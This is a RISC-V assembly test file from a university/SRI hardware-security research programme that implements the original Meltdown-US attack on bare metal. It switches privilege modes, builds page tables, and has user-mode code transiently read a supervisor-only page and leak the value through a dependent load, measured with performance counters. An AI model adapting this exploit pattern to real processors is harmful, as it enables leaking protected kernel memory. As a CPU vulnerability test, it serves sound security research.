/*-
 * SPDX-License-Identifier: BSD-2-Clause
 *
 * Copyright (c) 2021 Franz Fuchs
 * All rights reserved.
 *
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory (Department of Computer Science and
 * Technology) under DARPA contract HR0011-18-C-0016 ("ECATS"), as part of the
 * DARPA SSITH research programme.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include "../hpm_macros.h"


// original meltdown variant

.text
/*
Meltdown-US

This is the original meltdown attack. The adversary
runs in user mode and accesses a supervisor-only
page. This access will lead to fault being raised,
but in the meantime a transient execution sequence
will leak the secret through a side channel.


steps:
1. change to supervisor mode
2. set up the page table
3. preload pages needed for attack
4. change to user mode
5. access supervisor mode only page
6. leak address through side channel

*/

melt_us:
    jal ra, init_hpm

init_hpm:
    // prepare hardware performance monitoring
    // do counting of load request sent by the CPU
    HPM_SELECT_EVENT(3, 0x30)
    // enable reading from S mode
    HPM_M_ENABLE_X(3)
    HPM_S_ENABLE_X(3)

init_trap_vector:
    // all traps will end up in the pc
    // being set to trap_handler
    lla t0, trap_handler
    csrw mtvec, t0


change_to_S:
    // clear Trap Virtual Memory(TVM) bit
    li s1, 0x00100000
    csrc mstatus, s1

    // set MPP such that we return to S mode
    li s1, 0x00001000
    csrc mstatus, s1
    li s1, 0x00000800
    csrs mstatus, s1

    // load address of S mode code
    lla s2, set_page_table
    csrw mepc, s2

    // return to S mode code
    mret

trap_handler:
    // read value of counter 3 and store it to s11
    HPM_M_READ_X (s11, 3)

    // if successful, we expect 3 loads to have happened
    // 1 architectural load to the user mode page
    // 2 transient loads in U_mode_code that leak the
    // value the supervisor-only page
    HPM_TEST(s10, s11, 3)


#ifdef VCU_118
set_page_table:
    // set the satp register and page table accordingly
    // page table address is 0x000000c0002 (actual address 0xc0002000)
    // ASID is 0x0004 (random value)
    // MODE is 0x8 (for Sv39)
    li s0, 0x80004000000c0002
    csrw satp, s0
#else
set_page_table:
    // set the satp register and page table accordingly
    // page table address is 0x00000080002 (actual address 0x80002000)
    // ASID is 0x0004 (random value)
    // MODE is 0x8 (for Sv39)
    li s0, 0x8000400000080002
    csrw satp, s0
#endif

change_to_U:

    // perform a load to supervisor data page in order to:
    // - show that it works from supervisor mode
    // - preload it for the attack later
    lla s0, s_mem
    ld s0, 0(s0)

    // set SPP such that we return to U mode
    li s1, 0x00000100
    csrc sstatus, s1

    // load address of user mode code
    lla s2, U_mode_code
    csrw sepc, s2

    // return to U mode code
    sret

.section .melt_data , "adw"

s_mem:
  .dword 0x0000000000000100
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000


// this is a data section (for page table entries)
.section .table1 , "adw"

#ifdef VCU_118
table_1:
  // entire address as bits, e.g. 0xc0001000
  // 000 0000 1100 0000 0000 0000 0001 0000 0000 0000
  // 0x000 page offset
  // 0b0 0000 0001 vpn[0] ( vpn[0] * 8 = 8)
  // 0b0 0000 0000 vpn[1] ( vpn[1] * 8 = 0)
  // 0b0 0000 0011 vpn[2] ( vpn[2] * 8 = 24)

  // TODO

  // Level[1] PTE
  // D=0, A=0, G=0, U=0, X=0, W=0, R=0, V=1: 0x01
  // RSW=0b00
  // 0x00000080003 (ppn)
  // Reserved 0b 00 0000 000
  // 0x0000000030000c01
  .dword 0x0000000030000c01

  // PTE not in use
  .dword 0x0000000000000000
  // PTE not in use
  .dword 0x0000000000000000

  // Level[2] PTE
  // D=0, A=0, G=0, U=0, X=0, W=0, R=0, V=1: 0x01
  // RSW=0b00
  // 0x000000c0002 (ppn)
  // Reserved 0b 00 0000 000
  //.dword 0x0000000030000801
  .dword 0x0000000030000801
#else
table_1:
  // entire address as bits, e.g. 0x80001000
  // 000 0000 1000 0000 0000 0000 0001 0000 0000 0000
  // 0x000 page offset
  // 0b0 0000 0001 vpn[0] ( vpn[0] * 8 = 8)
  // 0b0 0000 0000 vpn[1] ( vpn[1] * 8 = 0)
  // 0b0 0000 0010 vpn[2] ( vpn[2] * 8 = 16)

  // Level[1] PTE
  // D=0, A=0, G=0, U=0, X=0, W=0, R=0, V=1: 0x01
  // RSW=0b00
  // 0x00000080003 (ppn)
  // Reserved 0b 00 0000 000
  // 0x0000000020000c01
  .dword 0x0000000020000c01

  // PTE not in use
  .dword 0x0000000000000000

  // Level[2] PTE
  // D=0, A=0, G=0, U=0, X=0, W=0, R=0, V=1: 0x01
  // RSW=0b00
  // 0x00000080002 (ppn)
  // Reserved 0b 00 0000 000
  //.dword 0x0000000020000801
  .dword 0x0000000020000801
#endif


// this is a data section (for page table entries)
.section .table2 , "adw"

#ifdef VCU_118
table_2:

  // supervisor code page
  // Level[0] text-PTE
  // D=0, A=1, G=0, U=0, X=1, W=0, R=1, V=1: 0x4b
  // RSW=0b00
  // 0x000000c0000 (ppn)
  // Reserved 0b 00 0000 000
  // 0x000000003000004b
  .dword 0x000000003000004b

  // supervisor data page
  // Level[0] data-PTE
  // NOTE: readable and writable, BUT NOT FROM USER MODE
  // D=0, A=1, G=0, U=0, X=0, W=1, R=1, V=1: 0x47
  // RSW=0b00
  // 0x000000c0001 (ppn)
  // Reserved 0b 00 0000 000
  // 0x0000000030000447
  .dword 0x0000000030000447

  // two pages not in use
  .dword 0x0000000000000000
  .dword 0x0000000000000000

  // user code page
  // Level[0] text-PTE
  // D=0, A=1, G=0, U=1, X=1, W=0, R=1, V=1: 0x5b
  // RSW=0b00
  // 0x000000c0004 (ppn)
  // Reserved 0b 00 0000 000
  // 0x000000003000105b
  .dword 0x000000003000105b

  // user data page
  // Level[0] data-PTE
  // NOTE: readable and writable from user mode
  // D=0, A=1, G=0, U=1, X=0, W=1, R=1, V=1: 0x57
  // RSW=0b00
  // 0x000000c0005 (ppn)
  // Reserved 0b 00 0000 000
  // 0x0000000030001457
  .dword 0x0000000030001457
#else
table_2:

  // supervisor code page
  // Level[0] text-PTE
  // D=0, A=1, G=0, U=0, X=1, W=0, R=1, V=1: 0x4b
  // RSW=0b00
  // 0x00000080000 (ppn)
  // Reserved 0b 00 0000 000
  // 0x000000002000004b
  .dword 0x000000002000004b

  // supervisor data page
  // Level[0] data-PTE
  // NOTE: readable and writable, BUT NOT FROM USER MODE
  // D=0, A=1, G=0, U=0, X=0, W=1, R=1, V=1: 0x47
  // RSW=0b00
  // 0x00000080001 (ppn)
  // Reserved 0b 00 0000 000
  // 0x0000000020000447
  .dword 0x0000000020000447

  // two pages not in use
  .dword 0x0000000000000000
  .dword 0x0000000000000000

  // user code page
  // Level[0] text-PTE
  // D=0, A=1, G=0, U=1, X=1, W=0, R=1, V=1: 0x5b
  // RSW=0b00
  // 0x00000080004 (ppn)
  // Reserved 0b 00 0000 000
  // 0x000000002000105b
  .dword 0x000000002000105b

  // user data page
  // Level[0] data-PTE
  // NOTE: readable and writable from user mode
  // D=0, A=1, G=0, U=1, X=0, W=1, R=1, V=1: 0x57
  // RSW=0b00
  // 0x00000080005 (ppn)
  // Reserved 0b 00 0000 000
  // 0x0000000020001457
  .dword 0x0000000020001457
#endif


// this is the code section for user mode code
.section .melt_utext , "ax"

U_mode_code:
    // user mode code

    // read value of counter 3 and store it to s10
    HPM_SU_READ_X (s10, 3)

    // access to user mode page to show that it works
    lla s0, u_mem
    ld s1, 0(s0)

    // access to supervisor mode page, which will
    // raise a fault
    lla s1, s_mem
    ld s1, 0(s1)
    // add offfset to user base address
    add s1, s0, s1
    // load from that address in order to
    // reveal secret value through side channel
    ld s2, 0(s1)


// this is the data section for user data
.section .melt_udata , "adw"

u_mem:
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000

.section .tohost , "adw"

tohost:
  .dword 0x0000000000000000
